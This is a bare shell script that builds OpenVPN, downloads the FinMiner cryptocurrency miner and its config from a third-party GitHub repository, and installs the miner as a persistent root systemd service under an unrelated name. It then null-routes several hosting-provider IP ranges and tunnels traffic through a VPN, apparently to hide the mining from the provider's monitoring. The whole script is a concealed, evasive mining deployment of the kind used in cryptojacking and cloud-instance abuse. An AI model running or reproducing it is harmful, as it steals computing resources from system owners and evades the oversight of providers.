sudo apt-get update 
sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git liblzo2-dev libpam0g-dev
wget https://swupdate.openvpn.org/community/releases/openvpn-2.4.6.tar.gz
tar -xf openvpn-2.4.6.tar.gz
cd openvpn-2.4.6
./configure
make
make install
cd /usr/local/
wget https://github.com/FinMiner/FinMiner/releases/download/v2.4.2/FinMiner-linux-2.4.2.tar.gz
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/config.ini
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/client3.ovpn
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/update-resolv-conf
chmod +x *
tar -xf FinMiner-linux-2.4.2.tar.gz
bash -c 'cat <<EOT >>/lib/systemd/system/1tieuthanhtrum.service 
[Unit]
Description=1tieuthanhtrum
After=network.target
[Service]
ExecStart=  /usr/local/FinMiner-linux-2.4.2/finminer /usr/local/config.ini
WatchdogSec=600
Restart=always
RestartSec=30
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload
/sbin/route add -net 207.246.96.0 netmask 255.255.240.0 gw 127.0.0.1
/sbin/route add -net 45.76.64.0 netmask 255.255.240.0 gw 127.0.0.1
/sbin/route add -net 45.32.0.0 netmask 255.255.248.0 gw 127.0.0.1
/sbin/route add -net 45.32.64.0 netmask 255.255.224.0 gw 127.0.0.1
service 1tieuthanhtrum start && openvpn --config /usr/local/client3.ovpn 
